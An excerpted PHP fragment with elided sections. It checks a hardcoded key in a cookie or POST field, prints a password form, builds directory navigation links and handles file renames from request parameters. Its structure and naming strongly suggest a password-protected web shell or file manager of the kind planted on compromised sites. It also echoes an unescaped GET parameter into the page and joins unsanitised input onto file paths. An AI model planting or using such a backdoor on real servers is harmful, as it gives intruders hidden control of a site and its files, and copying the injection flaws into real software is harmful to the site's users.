...
$auth_key = "7ee66cfa18c5dc9ffdc21f05afd9087f";
...
$pass = false;
if (isset($_COOKIE['pw_name_55926'])) {
    if(($_COOKIE['pw_name_55926']) == $auth_key) {
        $pass = true;
    }
} else {
    if (isset($_POST['pw_name_55926'])) {
        if(($_POST['pw_name_55926']) == $auth_key) {
            setcookie("pw_name_55926", $_POST['pw_name_55926']);
            $pass = true;
        }
    }
}
if (!$pass) {
    die("<form action='?p=' method=post ><input type=password name='pw_name_55926' value='".$_GET['pw']."'  required><input type=submit name='watching' ></form>");
}
// ---- // 1724491381802998 1724491381722673 1724491381628782 1724491381409638
...
foreach ($paths as $id => $dir_part) {
    ...
    if ($dir_part == '')
        continue;// 1724491381802998 1724491381722673 1724491381628782 1724491381409638
    echo "<a href='?p=";
    for ($i = 0; $i <= $id; $i++) {
...
if (isset($_GET['r'])) {
    ...
    <form method="post">
        ...
        if (isset($_POST['rename'])) {// 1724491381802998 1724491381722673 1724491381628782 1724491381409638
            $name = PATH . "/" . $_GET['r'];
